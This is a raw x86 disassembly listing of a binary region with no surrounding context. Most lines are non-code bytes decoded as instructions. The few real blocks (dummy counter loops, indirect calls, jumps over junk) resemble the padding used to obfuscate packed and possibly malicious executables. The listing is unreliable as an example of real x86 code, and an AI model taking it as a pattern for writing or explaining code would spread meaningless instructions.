  406c57:	icebp  
  406c58:	data16 arpl bx,cx
  406c5b:	pop    eax
  406c5c:	dec    ecx
  406c5d:	int    0xcf
  406c5f:	jle    0x406c48
  406c61:	lock push 0x6c8d5467
  406c67:	or     al,0x38
  406c69:	pop    ecx
  406c6a:	jns    0x406c24
  406c6c:	jl     0x406cb0
  406c6e:	inc    esp
  406c6f:	int3   
  406c70:	push   edi
  406c71:	aaa    
  406c72:	inc    esi
  406c73:	lahf   
  406c74:	stc    
  406c75:	in     eax,0x91
  406c77:	or     eax,0x85133931
  406c7c:	ror    BYTE PTR [edx-0x517f9575],0x85
  406c83:	lods   al,BYTE PTR ds:[esi]
  406c84:	jmp    0xb23f:0x986b3616
  406c8b:	sahf   
  406c8c:	ja     0x406cf5
  406c8e:	out    0x39,eax
  406c90:	sti    
  406c91:	mov    BYTE PTR [edi],dl
  406c93:	sbb    DWORD PTR [edi-0x6f],ebp
  406c96:	enter  0xee80,0x10
  406c9a:	ins    DWORD PTR es:[edi],dx
  406c9b:	fnstcw WORD PTR [edx+0x43]
  406c9e:	arpl   ax,ax
  406ca0:	inc    ecx
  406ca1:	rol    DWORD PTR [eax-0x1e26721f],cl
  406ca7:	aas    
  406ca8:	clc    
  406ca9:	adc    bh,BYTE PTR [eax+eax*2-0x47]
  406cad:	pop    esi
  406cae:	iret   
  406caf:	or     esi,DWORD PTR [ebp+0x2]
  406cb2:	sub    DWORD PTR [esi+0x1c],edi
  406cb5:	dec    esi
  406cb6:	ror    BYTE PTR [esi-0x1d92657e],1
  406cbc:	dec    ebp
  406cbd:	pop    esp
  406cbe:	and    bl,BYTE PTR [edi]
  406cc0:	rcl    DWORD PTR [ebx],1
  406cc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cc3:	pop    ebp
  406cc4:	jnp    0x406cd7
  406cc6:	cmp    ecx,DWORD PTR [esp+eax*2-0x773e37e0]
  406ccd:	cmp    ebx,DWORD PTR [esp+edi*1-0x47cd335e]
  406cd4:	fiadd  DWORD PTR [ebx]
  406cd6:	mov    edi,DWORD PTR [ebp-0x1c]
  406cd9:	cwde   
  406cda:	push   ss
  406cdb:	dec    edi
  406cdc:	je     0x406d1f
  406cde:	ja     0x406cf0
  406ce0:	inc    ecx
  406ce1:	jge    0x406cf0
  406ce3:	out    dx,eax
  406ce4:	push   eax
  406ce5:	fisubr WORD PTR [ebx]
  406ce7:	and    esp,edx
  406ce9:	cmc    
  406cea:	sbb    ecx,DWORD PTR [ebx+0x35]
  406ced:	cmp    eax,0x5447d17f
  406cf2:	popa   
  406cf3:	scas   al,BYTE PTR es:[edi]
  406cf4:	int    0xca
  406cf6:	mov    edi,0x7c68a732
  406cfb:	leave  
  406cfc:	mov    ebp,0xb43dd7d0
  406d01:	add    eax,0xa2b50005
  406d06:	adc    DWORD PTR [ecx],edi
  406d08:	mov    esi,0x9759cb22
  406d0d:	pop    edx
  406d0e:	sbb    eax,0xc974f7a
  406d13:	les    ebx,FWORD PTR [esi]
  406d15:	lahf   
  406d16:	fldcw  WORD PTR [ecx+0x368cdfe6]
  406d1c:	hlt    
  406d1d:	(bad)  
  406d1e:	mov    ebx,0x83a9f7e6
  406d23:	lods   al,BYTE PTR ds:[esi]
  406d24:	push   esp
  406d25:	push   esp
  406d26:	mov    edx,0x23f6a9f4
  406d2b:	mov    bl,0x10
  406d2d:	nop
  406d2e:	sti    
  406d2f:	mov    ds:0x91b724b7,al
  406d34:	inc    edx
  406d35:	in     eax,dx
  406d36:	sbb    BYTE PTR [eax],al
  406d38:	dec    eax
  406d39:	or     edi,DWORD PTR [ebx+0x74]
  406d3c:	lods   al,BYTE PTR ds:[esi]
  406d3d:	sub    ch,BYTE PTR [ebx-0x20]
  406d40:	mov    esp,0x8d7d7385
  406d45:	ret    0xbc83
  406d48:	xchg   edx,eax
  406d49:	cs mov ecx,0x8241f7e3
  406d4f:	retf   0xf230
  406d52:	xor    eax,0xccd1459a
  406d57:	mov    ah,0x1d
  406d59:	add    al,0x2f
  406d5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d5c:	fcom   DWORD PTR [ebx+0x6d]
  406d5f:	add    BYTE PTR [eax+0x3bd55b56],cl
  406d65:	cdq    
  406d66:	das    
  406d67:	cmc    
  406d68:	bound  ebp,QWORD PTR [edx]
  406d6a:	(bad)  
  406d6b:	fiadd  DWORD PTR [edi+ebx*8]
  406d6e:	call   0xa611:0x2a85c251
  406d75:	arpl   WORD PTR [eax-0x613eed03],cx
  406d7b:	cwde   
  406d7c:	scas   al,BYTE PTR es:[edi]
  406d7d:	jbe    0x406d69
  406d7f:	xchg   BYTE PTR [ecx+0x1b13abca],bl
  406d85:	xchg   BYTE PTR [ebx+0x3dd0e945],cl
  406d8b:	outs   dx,BYTE PTR ds:[esi]
  406d8c:	cmc    
  406d8d:	mov    ebx,0xf7047f0b
  406d92:	stos   BYTE PTR es:[edi],al
  406d93:	cmp    al,0x86
  406d95:	repz es mov bl,0x56
  406d99:	repnz mov ecx,0x81d1037e
  406d9f:	and    eax,0x4304df
  406da4:	add    BYTE PTR [eax],al
  406da6:	add    BYTE PTR [eax],al
  406da8:	mov    edi,DWORD PTR ds:0x4304df
  406dae:	inc    edi
  406daf:	mov    DWORD PTR ds:0x4304df,edi
  406db5:	cmp    DWORD PTR ds:0x4304df,0xa
  406dbc:	jne    0x406dcb
  406dc2:	push   DWORD PTR [ebp-0x1c]
  406dc5:	call   DWORD PTR ds:0x42ec23
  406dcb:	cmp    DWORD PTR ds:0x4304df,0x9
  406dd2:	jne    0x406de7
  406dd8:	xor    edi,edi
  406dda:	or     edi,DWORD PTR ds:0x4304df
  406de0:	inc    edi
  406de1:	mov    DWORD PTR ds:0x4304df,edi
  406de7:	cmp    DWORD PTR ds:0x4304df,0x19
  406dee:	jb     0x406da8
  406df4:	xor    DWORD PTR ds:0x42e7c0,edx
  406dfa:	jmp    0x406fab
  406dff:	xchg   BYTE PTR [ebx+0x34],bl
  406e02:	sahf   
  406e03:	icebp  
  406e04:	jno    0x406d9a
  406e06:	arpl   WORD PTR [ecx-0x9477b7b],si
  406e0c:	ins    DWORD PTR es:[edi],dx
  406e0d:	dec    ecx
  406e0e:	pop    ecx
  406e0f:	icebp  
  406e10:	cmp    BYTE PTR [esi+0x7e],bh
  406e13:	mov    bh,BYTE PTR [edi+0x7e]
  406e16:	jle    0x406e8d
  406e18:	push   es
  406e19:	addr16 xchg esi,eax
  406e1b:	adc    bl,BYTE PTR [ecx]
  406e1d:	mov    eax,0x2fba4184
  406e22:	jle    0x406dfa
  406e24:	push   0x910b0128
  406e29:	(bad)  
  406e2a:	mov    ch,0xe2
  406e2c:	pop    ecx
  406e2d:	das    
  406e2e:	popf   
  406e2f:	es jno 0x406dfc
  406e32:	mov    ds:0x6afedd27,al
  406e37:	outs   dx,BYTE PTR fs:[esi]
  406e39:	jl     0x406dbe
  406e3b:	or     dh,BYTE PTR [eax]
  406e3d:	xchg   esi,eax
  406e3e:	cmp    eax,DWORD PTR [ebp+edi*2+0x6e]
  406e42:	das    
  406e43:	in     al,dx
  406e44:	and    BYTE PTR [ecx+0x5827eb17],al
  406e4a:	sub    al,0x6f
  406e4c:	retf   
  406e4d:	cmp    al,0x72
  406e4f:	shl    DWORD PTR [edi],cl
  406e51:	add    BYTE PTR [esi+eiz*1],dl
  406e54:	or     ecx,esp
  406e56:	repnz jcxz 0x406e32
  406e5a:	clc    
  406e5b:	(bad)  
  406e5c:	scas   eax,DWORD PTR es:[edi]
  406e5d:	mov    dl,0x5c
  406e5f:	jne    0x406e02
  406e61:	mov    edx,0x2ebebfac
  406e66:	jmp    0x406e11
  406e68:	inc    eax
  406e69:	stc    
  406e6a:	jmp    DWORD PTR cs:[eax+0x55]
  406e6e:	cli    
  406e6f:	adc    esi,ebx
  406e71:	out    dx,al
  406e72:	outs   dx,BYTE PTR ds:[esi]
  406e73:	lods   al,BYTE PTR ds:[esi]
  406e74:	test   BYTE PTR [ecx],bl
  406e76:	and    DWORD PTR [ebp+eiz*1-0xc],ebx
  406e7a:	xor    ecx,edi
  406e7c:	rol    DWORD PTR [edi],0x24
  406e7f:	jo     0x406e19
  406e81:	mov    ebx,0x47a91291
  406e86:	jg     0x406e5f
  406e88:	mov    esi,ebp
  406e8a:	add    DWORD PTR [ebx-0x11],ebp
  406e8d:	(bad)  
  406e8e:	xchg   edi,eax
  406e8f:	ins    BYTE PTR es:[edi],dx
  406e90:	enter  0xcfcc,0x84
  406e94:	pop    esi
  406e95:	and    eax,0xc4aa20fb
  406e9a:	mov    BYTE PTR [ecx+0x92b9f9e],0x92
  406ea1:	pushf  
  406ea2:	sbb    BYTE PTR [esi-0x6],ah
  406ea5:	loop   0x406e2e
  406ea7:	inc    edx
  406ea8:	jae    0x406e70
  406eaa:	xchg   ebp,eax
  406eab:	(bad)  
  406eac:	add    ebp,eax
  406eae:	sar    BYTE PTR [edi],0x9d
  406eb1:	jp     0x406f27
  406eb3:	dec    ebx
  406eb4:	lods   al,BYTE PTR ds:[esi]
  406eb5:	js     0x406ec3
  406eb7:	enter  0x3374,0xed
  406ebb:	aaa    
  406ebc:	pop    es
  406ebd:	leave  
  406ebe:	inc    esi
  406ebf:	mov    ah,ah
  406ec1:	cli    
  406ec2:	add    esi,DWORD PTR [eax]
  406ec4:	adc    esi,edx
  406ec6:	jo     0x406e82
  406ec8:	fld    QWORD PTR [edx-0x606236d8]
  406ece:	int3   
  406ecf:	mov    edx,0x5f7c02d2
  406ed4:	fild   WORD PTR [edi-0x4d]
  406ed7:	aas    
  406ed8:	jmp    0x1daad065
  406edd:	aas    
  406ede:	mov    cl,0xab
  406ee0:	xchg   ecx,eax
  406ee1:	dec    ecx
  406ee2:	(bad)  
  406ee3:	lds    ebp,FWORD PTR [ecx-0x6089edb6]
  406ee9:	test   BYTE PTR [ebp+0x69],dh
  406eec:	into   
  406eed:	push   cs
  406eee:	adc    cl,0xe5
  406ef1:	test   BYTE PTR [eax-0x14],dl
  406ef4:	push   ecx
  406ef5:	retf   
  406ef6:	adc    ebp,DWORD PTR [ecx+0x5]
  406ef9:	and    bh,BYTE PTR [esi]
  406efb:	mov    eax,ds:0xafec8d00
  406f00:	(bad)  
  406f01:	cmp    dl,0xbd
  406f04:	mov    ecx,eax
  406f06:	shl    BYTE PTR ds:0x68a8f53c,1
  406f0c:	mov    DWORD PTR [ecx-0xe],eax
  406f0f:	out    0xa9,al
  406f11:	test   eax,0x6015ce81
  406f16:	addr16 add eax,0xc0ea5122
  406f1c:	js     0x406eef
  406f1e:	into   
  406f1f:	sbb    BYTE PTR [edx-0x115a2a73],bh
  406f25:	mov    ebp,ebp
  406f27:	xchg   edi,eax
  406f28:	mov    ebp,ds
  406f2a:	dec    ecx
  406f2b:	mov    eax,0x3b42b0e1
  406f30:	ret    0x873c
  406f33:	xchg   edx,eax
  406f34:	jmp    FWORD PTR [ebx-0x3c87a8ca]
  406f3a:	ins    BYTE PTR es:[edi],dx
  406f3b:	add    DWORD PTR ss:[ebx-0x27],esp
  406f3f:	fistp  WORD PTR ss:[ecx]
  406f42:	jno    0x406f76
  406f44:	jb     0x406f47
  406f46:	repz adc dl,ch
  406f49:	mov    ch,0xef
  406f4b:	fcomp  QWORD PTR [ecx-0x4c]
  406f4e:	fidivr WORD PTR [ebx+0x5d31a86e]
  406f54:	lahf   
  406f55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f56:	cmp    BYTE PTR ds:0xfa69b181,bl
  406f5c:	ds jnp 0x406f5f
  406f5f:	jne    0x406ee4
  406f61:	cmp    BYTE PTR [edi],bl
  406f63:	mov    al,0x43
  406f65:	(bad)  
  406f66:	push   cs
  406f67:	stos   DWORD PTR es:[edi],eax
  406f68:	mov    ecx,0xf472df65
  406f6d:	(bad)  
  406f6e:	leave  
  406f6f:	jle    0x406f05
  406f71:	jae    0x406f79
  406f73:	stos   DWORD PTR es:[edi],eax
  406f74:	paddw  mm5,QWORD PTR [eax-0x2d]
  406f78:	xchg   ebp,eax
  406f79:	mov    ch,0x94
  406f7b:	xchg   ebx,eax
  406f7c:	xchg   edx,eax
  406f7d:	sbb    eax,0xaddf856d
  406f82:	or     al,0x4c
  406f84:	pushf  
  406f85:	sahf   
  406f86:	mov    cs,WORD PTR [ecx+eax*1+0x61]
  406f8a:	jne    0x406fab
  406f8c:	jo     0x407003
  406f8e:	loopne 0x406f73
  406f90:	or     BYTE PTR [edi+ebx*8+0x5e],al
  406f94:	in     al,0xd3
  406f96:	fsub   DWORD PTR [ecx+0x34]
  406f99:	pushf  
  406f9a:	fsub   DWORD PTR [edi-0x384233ce]
  406fa0:	aas    
  406fa1:	ds int 0x9b
  406fa4:	xchg   ecx,eax
  406fa5:	neg    BYTE PTR [ebp+edx*8-0x7698f77d]
  406fac:	push   ebp
  406fad:	clc    
  406fae:	mov    edx,DWORD PTR [ebp+0x8]
  406fb1:	xor    edi,DWORD PTR ds:0x430465
  406fb7:	xor    edx,eax
  406fb9:	add    edx,ecx
  406fbb:	xor    DWORD PTR ds:0x430445,edi
  406fc1:	jmp    0x407172
  406fc6:	sub    DWORD PTR [ebx],ecx
  406fc8:	fnstsw WORD PTR [esi]
  406fca:	fucomp st(0)
  406fcc:	sub    ecx,ebp
  406fce:	cmp    DWORD PTR ds:0xb0dd3d82,edx
  406fd4:	adc    dh,bh
  406fd6:	or     eax,0x8a7e7ec6
  406fdb:	jg     0x40705b
  406fdd:	jle    0x40703e
  406fdf:	sar    BYTE PTR [esi+0x52],cl
  406fe2:	xor    eax,0xe050c1db
  406fe7:	bound  edx,QWORD PTR [esi+0x816db3c]
  406fed:	jbe    0x407036
  406fef:	add    BYTE PTR ds:0x2f1f39cc,0x20
  406ff6:	mov    BYTE PTR [eax],bl
  406ff8:	mov    BYTE PTR [ecx-0x25],dl
  406ffb:	mov    ebp,0x2cbc76ed
  407000:	lock test al,0x11
  407003:	mov    dl,0x2
  407005:	arpl   WORD PTR cs:[esi+0x25d81925],bp
  40700c:	lahf   
  40700d:	adc    ecx,eax
  40700f:	pop    edi
  407010:	mov    DWORD PTR [edx],eax
  407012:	bound  esi,QWORD PTR [ebp+0x729c781a]
  407018:	sar    cl,cl
  40701a:	dec    esp
  40701b:	sar    BYTE PTR [edx+esi*8-0x9],cl
  40701f:	shr    DWORD PTR [edi],0x42
  407022:	imul   DWORD PTR ds:0xf6c4d368
  407028:	mov    ebx,0xceee8a74
  40702d:	jmp    0x6a3c:0x88af1493
  407034:	jl     0x40705c
  407036:	pop    es
  407037:	int    0xc7
  407039:	jbe    0x40706c
  40703b:	xchg   esp,eax
  40703c:	mov    ds:0x661d6ca5,eax
  407041:	popa   
  407042:	or     ebp,ebp
  407044:	dec    eax
  407045:	push   ds
  407046:	or     BYTE PTR [ebx-0x65698084],dl
  40704c:	add    al,BYTE PTR [eax-0x423b8291]
  407052:	xchg   edi,eax
  407053:	stc    
  407054:	es ins BYTE PTR es:[edi],dx
  407056:	xchg   ebx,eax
  407057:	push   ebp
  407058:	dec    ebp
  407059:	outs   dx,BYTE PTR ds:[esi]
  40705a:	mov    esp,0xddb7929a
  40705f:	adc    ecx,DWORD PTR [ebp+0x60]
  407062:	mov    ebp,DWORD PTR [eax+0x29]
  407065:	in     al,dx
  407066:	sbb    ch,BYTE PTR ds:0x8f0a6d99
  40706c:	push   edx
  40706d:	fmul   DWORD PTR ds:0xc0bcb7a7
  407073:	sub    al,0x1f
  407075:	push   ds
  407076:	dec    ebp
  407077:	push   ss
  407078:	xor    ecx,DWORD PTR [ebx]
  40707a:	mov    edi,?
  40707c:	xchg   edi,eax
  40707d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40707e:	cmp    dl,BYTE PTR [eax+eax*8-0x56d2d651]
  407085:	in     eax,0xa4
  407087:	imul   ebx,DWORD PTR [eax],0xffffff90
  40708a:	adc    al,0xe7
  40708c:	jno    0x4070c9
  40708e:	cmp    dh,BYTE PTR [ecx+0x1a]
  407091:	das    
  407092:	lds    eax,FWORD PTR [eax+0xb]
  407095:	pop    es
  407096:	xor    BYTE PTR ds:0x9e79a62,bl
  40709c:	inc    eax
  40709d:	or     al,0x3e
  40709f:	in     al,dx
  4070a0:	leave  
  4070a1:	xacquire xchg DWORD PTR [edi+0x5b97f13b],esi
  4070a8:	pusha  
  4070a9:	inc    edx
  4070aa:	mov    ebx,0xeb7fa323
  4070af:	pop    eax
  4070b0:	inc    ebp
  4070b1:	setbe  BYTE PTR [ebx+0x169d9ad6]
  4070b8:	sbb    al,0xdd
  4070ba:	scas   eax,DWORD PTR es:[edi]
  4070bb:	es xor al,0x66
  4070be:	inc    ebp
  4070bf:	adc    al,0x2b
  4070c1:	lods   eax,DWORD PTR ds:[esi]
  4070c2:	pop    edx
  4070c3:	mov    ebp,0xb979c26e
  4070c8:	inc    ebx
  4070c9:	retf   0x6572
  4070cc:	cs push eax
  4070ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070cf:	jno    0x4070da
  4070d1:	lds    ebx,FWORD PTR [eax+ebx*4+0x28]
  4070d5:	aaa    
  4070d6:	xchg   ebp,eax
  4070d7:	shl    BYTE PTR [eax-0x69cb1b01],1
  4070dd:	xor    DWORD PTR [eax-0xc],edx
  4070e0:	pushf  
  4070e1:	fstp   QWORD PTR es:[ebp+0x57f1d32f]
  4070e8:	inc    esi
  4070e9:	mov    DWORD PTR [ebx-0x1d989e74],edx
  4070ef:	nop
  4070f0:	fild   QWORD PTR [esi+esi*1+0x73]
  4070f4:	cmp    al,0x9e
  4070f6:	inc    ebp
  4070f7:	add    ecx,DWORD PTR [ebx+0x51]
  4070fa:	xor    bl,BYTE PTR [ebx+0x35400b1c]
  407100:	push   ebp
  407101:	and    DWORD PTR [ecx],edx
  407103:	jne    0x4070dd
  407105:	add    DWORD PTR [esi+esi*8-0x44636c74],0xfffffff9
  40710d:	push   ss
  40710e:	mov    DWORD PTR [ebp+edx*8+0x68f31b33],ebx
  407115:	xlat   BYTE PTR ds:[ebx]
  407116:	cmc    
  407117:	add    ecx,eax
  407119:	mov    edx,0x8ae8f39f
  40711e:	mov    esp,?
  407120:	jge    0x40712e
  407122:	adc    BYTE PTR [ecx+0x25],bl
  407125:	or     DWORD PTR [edi-0x2626e84f],edi
  40712b:	push   0xfffffff1
  40712d:	or     al,0x91
  40712f:	daa    
  407130:	push   es
  407131:	cmp    BYTE PTR [edi-0x113e69f4],ah
  407137:	add    al,0x57
  407139:	or     esi,DWORD PTR ss:[ebx+ecx*4]
  40713d:	fdivp  st(5),st
  40713f:	add    al,0xc4
  407141:	sub    bh,bl
  407143:	pop    eax
  407144:	lea    ecx,[ecx]
  407146:	xchg   edi,eax
  407147:	cmc    
  407148:	lods   eax,DWORD PTR ds:[esi]
  407149:	push   ebx
  40714a:	xchg   edi,eax
  40714b:	test   al,0x8e
  40714d:	fidivr WORD PTR [esi+ebx*1]
  407150:	push   es
  407151:	lock or bh,BYTE PTR [ebx-0x688e0e58]
  407158:	sub    bh,dh
  40715a:	lock arpl WORD PTR [eax+edx*4-0x8],ax
  40715f:	(bad)  
  407160:	icebp  
  407161:	repz xchg edi,eax
  407163:	sub    BYTE PTR [esi-0x376008d],al
  407169:	call   0xad9f:0x3f222a76
  407170:	inc    ebx
  407171:	icebp  
  407172:	mov    DWORD PTR [ebp+0xc],edx
  407175:	and    DWORD PTR ds:0x42e7c0,0x0
  40717f:	jmp    0x407191
  407184:	mov    edi,DWORD PTR ds:0x42e7c0
  40718a:	inc    edi
  40718b:	mov    DWORD PTR ds:0x42e7c0,edi
  407191:	cmp    DWORD PTR ds:0x42e7c0,0x1a
  407198:	jae    0x4071c1
  40719e:	cmp    DWORD PTR ds:0x42e7c0,0x28
  4071a5:	jne    0x4071b6
  4071ab:	push   0x716b
  4071b0:	call   DWORD PTR ds:0x42eaab
  4071b6:	jmp    0x407184
  4071bb:	and    DWORD PTR ds:0x430469,edi
  4071c1:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  4071c8:	adc    edi,DWORD PTR ds:0x43044d
  4071ce:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  4071d5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4071dc:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4071e3:	and    DWORD PTR ds:0x430461,0x0
  4071ed:	mov    edi,DWORD PTR ds:0x430461
  4071f3:	inc    edi
  4071f4:	mov    DWORD PTR ds:0x430461,edi
  4071fa:	cmp    DWORD PTR ds:0x430461,0x6
  407201:	jne    0x407247
  407207:	push   0x42e929
  40720c:	push   DWORD PTR [ebp-0x14]
  40720f:	push   0x2c1e
  407214:	push   0x5ddb
  407219:	push   DWORD PTR [ebp-0x20]
  40721c:	push   0x67ee
  407221:	push   DWORD PTR [ebp-0x18]
  407224:	push   DWORD PTR [ebp-0x24]
  407227:	push   DWORD PTR [ebp-0x14]
  40722a:	push   0x21a8
  40722f:	push   0x81f6
  407234:	push   0x1b91
  407239:	push   0x8bde
  40723e:	push   DWORD PTR [ebp-0x28]
  407241:	call   DWORD PTR ds:0x42eaaf
  407247:	cmp    DWORD PTR ds:0x430461,0x5
  40724e:	jne    0x407261
  407254:	mov    edi,DWORD PTR ds:0x430461
  40725a:	inc    edi
  40725b:	mov    DWORD PTR ds:0x430461,edi
  407261:	cmp    DWORD PTR ds:0x430461,0x12
  407268:	jb     0x4071ed
  40726e:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  407275:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40727c:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  407283:	mov    edx,DWORD PTR [ebp+0x8]
  407286:	xor    edi,edi
  407288:	add    edi,DWORD PTR ds:0x42e7bc
  40728e:	or     DWORD PTR ds:0x430465,edi
  407294:	jmp    0x407445
  407299:	mov    edx,0xad140ee9
  40729e:	icebp  
  40729f:	inc    eax
  4072a0:	jno    0x4072e6
  4072a2:	mov    eax,ds:0xa6c33f15
  4072a7:	int    0x38
  4072a9:	cdq    
  4072aa:	(bad)  
  4072ab:	jle    0x40732b
  4072ad:	mov    bh,BYTE PTR [edi+0x7e]
  4072b0:	jle    0x407239
  4072b2:	adc    al,0xa7
  4072b4:	mov    edx,0x92f0a83d
  4072b9:	xchg   DWORD PTR [ebx+0x4d66af55],esp
  4072bf:	stos   BYTE PTR es:[edi],al
  4072c0:	inc    edi
  4072c1:	cld    
  4072c2:	sub    eax,0x4b70c1cb
  4072c7:	pop    ss
  4072c8:	cmp    al,0xa0
  4072ca:	retf   0xb2fb
  4072cd:	outs   dx,BYTE PTR ds:[esi]
  4072ce:	or     al,0x6d
  4072d0:	ja     0x4072a7
  4072d2:	mov    ah,0xd1
  4072d4:	loope  0x407348
  4072d6:	lahf   
  4072d7:	inc    edx
  4072d8:	(bad)  
  4072da:	fucomip st,st(0)
  4072dc:	loope  0x407350
  4072de:	call   0x2abd7d53
  4072e3:	icebp  
  4072e4:	hlt    
  4072e5:	cmc    
  4072e6:	in     al,0x92
  4072e8:	xor    al,0x0
  4072ea:	and    ah,dl
  4072ec:	or     ebp,DWORD PTR [edi+0x5b12e380]
  4072f2:	mov    ch,0x15
  4072f4:	mov    dh,0x47
  4072f6:	jmp    0x407314
  4072f8:	cmc    
  4072f9:	pop    ds
  4072fa:	(bad)  
  4072fc:	xor    al,0x15
  4072fe:	mov    al,0xe7
  407300:	push   edx
  407301:	jmp    0x40732a
  407303:	adc    BYTE PTR [eax-0x279a5fa5],0xf8
  40730a:	cdq    
  40730b:	int    0x65
  40730d:	lahf   
  40730e:	inc    edx
  40730f:	stc    
  407310:	add    DWORD PTR [edi+0x58],ebx
  407313:	cld    
  407314:	mov    bh,0x5e
  407316:	push   esp
  407317:	jmp    0x407301
  407319:	fcmovnb st,st(3)
  40731b:	retf   
  40731c:	popf   
  40731d:	fisttp DWORD PTR [ebx+0x3e]
  407320:	inc    edx
  407321:	jge    0x407349
  407323:	ret    
  407324:	test   al,0xa3
  407326:	inc    edx
  407327:	mov    al,0xb4
  407329:	push   ebp
  40732a:	fbstp  TBYTE PTR [edx-0x72]
  40732d:	cld    
  40732e:	xor    BYTE PTR [ecx+0x403ed0c4],dl
  407334:	fcom   QWORD PTR [ebx]
  407336:	fdivr  DWORD PTR [esi-0x4cb3b36f]
  40733c:	out    0xd9,al
  40733e:	xchg   BYTE PTR [eax-0x66b37176],bh
  407344:	pop    es
  407345:	pop    edx
  407346:	ficom  WORD PTR ds:0x735b0d35
  40734c:	mov    eax,ds:0xdd7f16f7
  407351:	sub    edi,DWORD PTR es:[ebx-0x40]
  407355:	in     eax,dx
  407356:	push   ebx
  407357:	jmp    DWORD PTR [ebx-0x3d]
  40735a:	(bad)  
  40735b:	xchg   ecx,eax
  40735c:	imul   ecx,ecx,0x3b
  40735f:	rcr    eax,cl
  407361:	xor    cl,ch
  407363:	dec    ecx
  407364:	js     0x40733a
  407366:	pop    eax
  407367:	jg     0x40739a
  407369:	xor    DWORD PTR [edi-0x5bd9d27c],edx
  40736f:	adc    eax,0xfff236e9
  407374:	jno    0x407314
  407376:	add    al,BYTE PTR [edx]
  407378:	out    0xee,eax
  40737a:	sub    BYTE PTR [ecx+0x32],dl
  40737d:	adc    bx,WORD PTR [edx+0x37]
  407381:	sub    DWORD PTR [eax-0x29ff7101],0xffffffbb
  407388:	aam    0xb5
  40738a:	(bad)  
  40738b:	mov    ecx,0x6feaeb12
  407390:	sbb    eax,0xdcd51f24
  407395:	call   0xec21741b
  40739a:	sbb    BYTE PTR [eax],ah
  40739c:	int3   
  40739d:	jb     0x4073ee
  40739f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073a0:	cmp    al,0x74
  4073a2:	sub    DWORD PTR [ebx],ebp
  4073a4:	push   0xffffffd3
  4073a6:	gs push edi
  4073a8:	xchg   ebx,eax
  4073a9:	xor    ah,BYTE PTR [eax+0x55bd588c]
  4073af:	or     BYTE PTR [eax],al
  4073b1:	mov    ch,BYTE PTR [edx]
  4073b3:	mov    DWORD PTR [ebp-0x11f0ba43],edi
  4073b9:	push   edi
  4073ba:	fcomp  QWORD PTR [ecx-0x26]
  4073bd:	into   
  4073be:	imul   ebp,DWORD PTR [esi],0xffffffb9
  4073c1:	into   
  4073c2:	test   eax,0x8ea630d8
  4073c7:	pop    esp
  4073c8:	push   esp
  4073c9:	addr16 cdq 
  4073cb:	sahf   
  4073cc:	mov    ah,0x11
  4073ce:	jo     0x40737d
  4073d0:	cmp    eax,0xd9ae8792
  4073d6:	mov    ecx,0x2aac4967
  4073db:	mov    al,ds:0x246c583c
  4073e0:	push   cs
  4073e1:	call   0xb45a:0x815e24e6
  4073e8:	loopne 0x40739d
  4073ea:	pusha  
  4073eb:	loop   0x407423
  4073ed:	sub    eax,0xe6811bc5
  4073f2:	aam    0xc1
  4073f4:	sar    bl,1
  4073f6:	jp     0x40746f
  4073f8:	sub    cl,BYTE PTR gs:[edi-0x7f8a0e34]
  4073ff:	ins    BYTE PTR es:[edi],dx
  407400:	fcmovbe st,st(7)
  407402:	inc    eax
  407403:	sub    DWORD PTR [ebx-0x18f1a446],0xffffffe0
  40740a:	out    0xda,al
  40740c:	push   edx
  40740d:	popf   
  40740e:	pop    ebp
  40740f:	shl    BYTE PTR [esi],cl
  407411:	imul   esi,ebx,0x78918713
  407417:	in     al,dx
  407418:	pop    ds
  407419:	js     0x407465
  40741b:	cli    
  40741c:	pop    edx
  40741d:	neg    DWORD PTR [eax-0x71]
  407420:	push   edi
  407421:	scas   eax,DWORD PTR es:[edi]
  407422:	retf   0x9080
  407425:	push   ecx
  407426:	cmp    eax,0xb7a597d9
  40742b:	scas   eax,DWORD PTR es:[edi]
  40742c:	jnp    0x407454
  40742e:	xchg   BYTE PTR [ebp+eiz*4+0x273a0262],dh
  407435:	popf   
  407436:	xor    ebx,0xffffffee
  407439:	xchg   edi,eax
  40743a:	(bad)  
  40743b:	sbb    DWORD PTR [edi],ebx
  40743d:	lock jbe 0x4073ee
  407440:	adc    eax,0x9f50b6cb
  407445:	xor    edx,eax
  407447:	mov    edi,DWORD PTR [ebp-0x10]
  40744a:	or     DWORD PTR ds:0x4304d7,0x71a5
  407454:	add    edx,ecx
  407456:	mov    DWORD PTR ds:0x430449,0x5a49
  407460:	cmp    edi,edx
  407462:	mov    DWORD PTR ds:0x4304cf,0x6748
  40746c:	jmp    0x40761d
  407471:	not    DWORD PTR [ebp+edx*8-0xca68ae7]
  407478:	push   eax
  407479:	jb     0x4074d4
  40747b:	out    dx,eax
  40747c:	or     ch,bh
  40747e:	push   ds
  40747f:	rol    BYTE PTR [ecx+0x7e7ec535],0x8a
  407486:	jg     0x407506
  407488:	jle    0x4074e2
  40748a:	aas    
  40748b:	sbb    esi,DWORD PTR [edi]
  40748d:	mov    ecx,0x322dad68
  407492:	test   bh,dh
  407494:	mov    bl,0xcc
  407496:	test   BYTE PTR [ecx],dl
  407498:	(bad)  
  407499:	sahf   
  40749a:	aaa    
  40749b:	lahf   
  40749c:	outs   dx,BYTE PTR ds:[esi]
  40749d:	push   0xffffffa5
  40749f:	lahf   
  4074a0:	sbb    al,0xe7
  4074a2:	mov    bh,0xb9
  4074a4:	pushf  
  4074a5:	shl    DWORD PTR [ebx-0x4e],0x60
  4074a9:	push   eax
  4074aa:	sub    al,bl
  4074ac:	sahf   
  4074ad:	hlt    
  4074ae:	and    ebx,DWORD PTR [ebx+0x6a]
  4074b1:	rcl    ebx,cl
  4074b3:	fwait
  4074b4:	cdq    
  4074b5:	(bad)  
  4074b6:	daa    
  4074b7:	add    BYTE PTR [eax],dl
  4074b9:	pop    ebx
  4074ba:	mov    eax,0x43ff73d0
